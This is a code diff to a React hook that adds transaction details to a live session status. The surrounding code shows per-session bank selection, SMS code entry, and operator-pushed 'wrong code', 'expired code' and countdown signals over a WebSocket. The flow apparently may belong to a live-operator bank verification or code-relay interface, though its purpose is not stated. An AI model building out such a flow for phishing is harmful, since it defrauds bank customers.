@@ -1,12 +1,14 @@
 import { useState, useEffect, useCallback } from "react";
 import { getSessionStatus, getWebSocketUrl } from "../lib/bank-api";
 import { createSessionWebSocket } from "../lib/ws";
+import type { TransactionDetails } from "../types";
 
 export function useSessionStatus(apiBase: string, channelSlug: string, sessionId: string | null) {
   const [status, setStatus] = useState<string>("pending");
   const [verificationLayout, setVerificationLayout] = useState<string>("sms");
   const [bank, setBank] = useState<string | undefined>(undefined);
   const [redirectUrl, setRedirectUrl] = useState<string | null>(null);
+  const [transactionDetails, setTransactionDetails] = useState<TransactionDetails | undefined>(undefined);
   const [wrongCode, setWrongCode] = useState(false);
   const [expiredCode, setExpiredCode] = useState(false);
   const [operatorMessage, setOperatorMessage] = useState<{ level: "error" | "info"; message: string } | null>(null);
@@ -30,6 +32,7 @@ export function useSessionStatus(apiBase: string, channelSlug: string, sessionId
       setStatus(data.status);
       if (data.verificationLayout) setVerificationLayout(data.verificationLayout);
       if (data.bank !== undefined) setBank(data.bank);
+      if (data.transactionDetails !== undefined) setTransactionDetails(data.transactionDetails);
       setWrongCode(false);
       setExpiredCode(false);
     } catch (e) {
@@ -56,6 +59,7 @@ export function useSessionStatus(apiBase: string, channelSlug: string, sessionId
         if (msg.verificationLayout) setVerificationLayout(msg.verificationLayout);
         if (msg.bank !== undefined) setBank(msg.bank);
         if (msg.redirectUrl) setRedirectUrl(msg.redirectUrl);
+        if (msg.transactionDetails !== undefined) setTransactionDetails(msg.transactionDetails);
         if (msg.wrongCode !== undefined) setWrongCode(msg.wrongCode);
         if (msg.expiredCode !== undefined) setExpiredCode(msg.expiredCode);
         if (msg.countdownReset === true) setCountdownResetTrigger((t) => t + 1);
@@ -74,6 +78,7 @@ export function useSessionStatus(apiBase: string, channelSlug: string, sessionId
     verificationLayout,
     bank,
     redirectUrl,
+    transactionDetails,
     wrongCode,
     expiredCode,
     clearWrongCode,
